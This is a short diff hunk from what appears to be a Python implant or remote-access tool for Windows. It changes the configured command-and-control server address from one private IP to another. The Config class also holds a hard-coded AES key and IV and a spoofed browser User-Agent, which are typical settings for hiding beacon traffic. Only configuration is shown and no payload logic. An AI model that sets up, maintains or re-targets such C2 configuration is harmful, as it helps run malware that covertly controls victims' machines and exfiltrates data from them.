@@ -39,7 +39,7 @@ from ctypes import wintypes
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.147.1"
+        self.C2_SERVER = "https://192.168.16.78"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
